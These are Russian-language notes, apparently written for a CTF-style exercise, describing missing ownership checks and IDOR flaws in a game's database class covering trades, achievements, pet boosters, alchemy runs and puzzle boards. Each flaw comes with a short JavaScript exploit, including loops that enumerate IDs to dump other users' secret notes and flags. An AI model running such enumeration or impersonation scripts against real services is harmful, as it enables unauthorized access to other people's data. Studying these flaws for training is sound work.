# Суть уязвимости acceptTradeVulnerable:
Проблема: Любой пользователь может принять любой трейд и склонировать любую карту.

typescript
acceptTradeVulnerable(_userId: number, tradeId: number) {
    // 1. _userId игнорируется - нет проверки, что я получатель
    // 2. Создается НОВАЯ карта (INSERT), а не передается существующая
    // 3. Оригинальная карта остается у владельца
}
Юзабилити:
// Алиса создает редкую карту
const cardId = db.createCard(aliceId, "Dragon", 999);

// Алиса создает трейд для Боба
const tradeId = db.createTrade(aliceId, bobId, cardId);

// Злоумышленник (Мэллори) перехватывает tradeId
db.acceptTradeVulnerable(malloryId, tradeId);
// Результат: у Мэллори появилась копия карты Dragon,
// а оригинал все еще у Алисы!

# Уязвимость в getAchievementDetailsVulnerable: утечка секретной заметки (secret_note) любого пользователя
Исходный код (уязвимый):

// Мэллори подставляет любое имя пользователя (игнорируется) и известный ID достижения
const secret = db.getAchievementDetailsVulnerable(
  "any_username",    // можно написать что угодно, даже несуществующего пользователя
  "ARCHIVIST",       // код не важен, т.к. передан achievementId
  42                 // ID достижения Алисы
);
или 
const secret = db.getAchievementDetailsVulnerable(
  "some_other_user",
  "ARCHIVIST"
  // achievementId не указан, вернётся последнее достижение с кодом ARCHIVIST у любого пользователя
);
# Уяза в applyBoosterVulnerable
Условия эксплуатации
Злоумышленник должен иметь хотя бы один неиспользованный бустер (pet_boosters с used = 0 и user_id = злоумышленник).

Он должен знать или угадать petId чужого питомца (ID часто идут последовательно, их можно подобрать или получить через метод getPet, который тоже не проверяет права).

Метод должен быть доступен через API (например, как эндпоинт /api/pet/apply_booster).

Пример эксплойта (скрипт на Node.js)

import Db from './db.js'; // предполагаемый путь к вашему классу Db

// Предположим, у нас есть экземпляр db (уже открытая БД)
const db = new Db('./game.db');

// Данные злоумышленника (Мэллори)
const malloryId = 123;        // ID Мэллори в системе
const malloryBoosterId = 456; // ID его бустера (можно получить через createBooster)

// Цель – питомец Алисы, ID которого Мэллори узнал (например, 789)
const alicePetId = 789;

try {
  // Применяем бустер к чужому питомцу
  const result = db.applyBoosterVulnerable(malloryId, malloryBoosterId, alicePetId);
  console.log('Успешно применён бустер к чужому питомцу:', result);
  // bio питомца Алисы изменилось на "Blessed by <payload>"
} catch (err) {
  console.error('Ошибка:', err.message);
}
# Уяза в finalizeAlchemyRunVulnerable – финализация чужого алхимического эксперимента
Проблема: нет проверки, что runId принадлежит пользователю _userId. Злоумышленник может подставить любой _userId (например, свой) и завершить чужой эксперимент
Пример эксплуатации 
import Db from './db.js';

const db = new Db('./game.db');

// Злоумышленник Мэллори (его ID)
const malloryId = 999;
// Он узнал ID чужого алхимического эксперимента (например, Алисы) – 12345
const aliceRunId = 12345;

try {
  // Вызов с _userId = свой, но runId – чужой
  const result = db.finalizeAlchemyRunVulnerable(malloryId, aliceRunId, "Malory's artifact note");
  console.log('Чужой эксперимент завершён:', result);
  // Мэллори получает достижение и +90 очков в игру "alchemy"
} catch (err) {
  console.error('Ошибка:', err.message);
}
# Уяза в createTrade
Метод createTrade(fromUserId, toUserId, cardId) не проверяет, что карта с идентификатором cardId действительно принадлежит пользователю fromUserId. 
Пример эксплуатации (скрипт)
const db = new Db('./game.db');

// Злоумышленник Мэллори знает ID редкой карты Алисы (например, cardId = 100)
const aliceCardId = 100;
// Мэллори создаёт трейд, указывая fromUserId = Алиса, toUserId = свой ID
const tradeId = db.createTrade(aliceId, malloryId, aliceCardId);
console.log(`Создан фальшивый трейд ${tradeId} от Алисы к Мэллори на карту Алисы`);

// Если бы acceptTrade не проверял владение (как было изначально), Мэллори мог бы принять трейд и забрать карту.
// Сейчас acceptTrade проверяет, но всё равно в БД появляется мусорная запись.
Или
// Можно указать любого пользователя, даже несуществующего (при нарушении внешнего ключа? FOREIGN KEY проверит, но пользователь должен существовать)
const fakeUserId = 999999; // если такого нет, то FOREIGN KEY выбросит ошибку. Но можно использовать существующего.
db.createTrade(fakeUserId, malloryId, aliceCardId); // ошибка foreign key, если fakeUserId нет

# (pi)Idorы 
1. Уязвимость в getPuzzleBoard
Проблема: метод getPuzzleBoard(boardId) возвращает полную информацию о доске (включая stego_payload и tiles_seed) без проверки, принадлежит ли доска текущему пользователю. Любой, кто знает или подберёт boardId, может прочитать скрытое сообщение (stegoPayload), которое часто является флагом или секретной наградой.

Пример эксплуатации (скрипт):

javascript
const db = new Db('./game.db');

// Подбираем ID досок, начиная с 1
for (let boardId = 1; boardId <= 1000; boardId++) {
  const board = db.getPuzzleBoard(boardId);
  if (board && board.stegoPayload) {
    console.log(`[!] Украден stegoPayload доски ${boardId} (владелец user ${board.userId}): ${board.stegoPayload}`);
  }
}
Результат: злоумышленник узнаёт все секретные сообщения всех пазлов.

2. Уязвимость в getCard
Проблема: метод getCard(cardId) возвращает данные любой карты (customName, power, metadataJson) по её id, без проверки владельца. Это позволяет узнать состав колоды, силу карт и метаданные других игроков.

Пример эксплуатации (скрипт):

javascript
// Получаем информацию о всех картах в системе
for (let cardId = 1; cardId <= 5000; cardId++) {
  const card = db.getCard(cardId);
  if (card) {
    console.log(`Card ${cardId}: owner=${card.userId}, name=${card.customName}, power=${card.power}, meta=${card.metadataJson}`);
  }
}
Результат: злоумышленник видит все карты всех игроков, может подбирать уязвимые цели для трейдов.

3. Уязвимость в getPet
Проблема: метод getPet(petId) отдаёт полную информацию о питомце другого пользователя, включая state_json (состояние, прогресс, секретные параметры). Это позволяет следить за чужими питомцами.

Пример эксплуатации:
for (let petId = 1; petId <= 2000; petId++) {
  const pet = db.getPet(petId);
  if (pet) {
    console.log(`Pet ${petId}: owner=${pet.userId}, name=${pet.name}, state=${pet.stateJson}`);
  }
}
Результат: злоумышленник получает полную информацию о прогрессе и состоянии чужих питомцев.

4. Уязвимость в getAlchemyArtifact
Проблема: метод getAlchemyArtifact(runId) возвращает данные любого алхимического эксперимента, включая artifact_note (может содержать флаг) и состояние state без проверки владельца. Даже финализированные артефакты становятся публичными.

Пример эксплуатации:
for (let runId = 1; runId <= 1000; runId++) {
  const art = db.getAlchemyArtifact(runId);
  if (art) {
    console.log(`Alchemy ${runId}: user=${art.userId}, state=${art.state}, note=${art.artifactNote}`);
  }
}
Результат: злоумышленник читает чужие артефакты и заметки.

Почему это опасно (общее для всех)
Нарушение конфиденциальности: любой может прочитать любые данные системы.
В stego_payload, artifact_note, metadata_json и state_json часто хранятся флаги, ключи, приватные сообщения или награды.
Атакующий не нуждается в авторизации — достаточно иметь доступ к экземпляру Db (например, через инъекцию или если эти методы торчат наружу в API).

